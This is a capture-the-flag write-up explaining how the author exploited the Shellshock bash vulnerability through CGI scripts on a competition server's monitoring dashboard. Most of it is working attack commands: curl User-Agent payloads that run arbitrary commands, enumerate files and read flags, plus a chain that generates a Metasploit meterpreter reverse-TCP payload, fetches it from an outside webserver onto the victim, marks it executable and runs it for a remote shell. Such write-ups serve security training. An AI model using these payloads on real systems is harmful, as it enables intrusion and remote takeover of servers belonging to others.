Target: 54.83.28.186

Note: I did won't be saying how to get Flag 5, as I got an "incorrect" way from another group after the competition and don't want to spoil their secret.

This challenge had a System Monitoring dashboard which had a few CGI Scripts.  The names of the CGI files were standard linux binaries (ps, who, ifconfig, etc).  This led me to believe the CGI Scripts were just bash scripts, which had a major vulnerability recently (September 2014).  The dashboard had a "Package List" so I went there to confirm the version of bash and saw it was at 4.2-2, which is vulnerable to Shellshock.

Since Apache passes the User Agent to the CGI Scripts, it is possible to exploit over the web.  I had used a simple curl string to confirm the server was vulnerable: `curl -k -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/ls' https://54.83.28.186/cgi-bin/sysinfo.cgi`.  Once I confirmed it was vulnerable I had copied a list of all the filenames the www-data had access to via: `curl -k -A '() { :;}; echo "Content-Type: text/plain"; echo; /usr/bin/find /' https://54.83.28.186/cgi-bin/sysinfo.cgi > files.lst`.  Running grep flag files.lst, I was able to find 4 flag locations, a simple cat would retrieve the flags.  Unfortunately, the fifth flag was not there, I had done recursive grep for NCL- to search the contents of every file www-data had access to.  No luck.

In order to perform the actual exploit; I assume you will need a shell, so here is how to load meterpreter.  Since this is a Reverse Connect, you will need to ensure that the <PORT> specified below is routable over the WAN by most likely creating a NAT Rule.

Generate the payload with: `msfpayload linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> R | msfencode -t elf -o meterpreter -e generic/none` and then upload it to a webserver.  Once it is uploaded open msfconsole and run:
<ul>
	<li>use exploit/multi/handler</li>
	<li>set LHOST 0.0.0.0</li>
	<li>set LPORT <PORT></li>
	<li>set payload linux/x86/meterpreter/reverse_tcp</li>
	<li>exploit</li>
</ul>
Open a new terminal window and execute the meterpreter shell on the victim by running:

<ul>
	<li>curl -k -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/rm -f /tmp/meterpreter;' https://54.83.28.186/cgi-bin/sysinfo.cgi</li>
	<li>curl -k -A '() { :;}; echo "Content-Type: text/plain"; echo; /usr/bin/curl <url to meterpreter> -o /tmp/meterpreter;' https://54.83.28.186/cgi-bin/sysinfo.cgi</li>
	<li>curl -k -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/chmod +x /tmp/meterpreter;' https://54.83.28.186/cgi-bin/sysinfo.cgi</li>
	<li>curl -k -A '() { :;}; echo "Content-Type: text/plain"; echo; /tmp/meterpreter;' https://54.83.28.186/cgi-bin/sysinfo.cgi</li>
</ul>

And back on your metasploit session, you should have a meterpreter session; simply enter `shell` and you should be granted with a full shell on the victim!
